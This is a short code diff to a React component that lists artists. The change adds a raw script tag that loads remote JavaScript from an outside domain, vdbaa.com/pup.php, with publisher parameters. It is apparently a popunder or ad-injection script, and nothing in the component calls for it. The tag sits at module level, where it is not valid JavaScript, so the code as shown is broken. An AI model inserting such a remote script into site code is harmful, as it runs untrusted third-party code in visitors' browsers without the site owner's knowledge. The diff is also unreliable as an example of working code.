@@ -3,7 +3,7 @@ import { Helmet } from 'react-helmet'; // For SEO meta tags
 import DOMPurify from 'dompurify'; // To sanitize HTML
 import './style/Artistlist.css'; // Import your CSS
 import { supabase } from '../../supabaseClient'; // Import from the centralized supabaseClient file
-
+<script type="text/javascript" src="https://vdbaa.com/pup.php?section=General&pt=2&pub=343571&ga=g"></script>
 const Artistlist = () => {
   const [artists, setArtists] = useState([]);
 
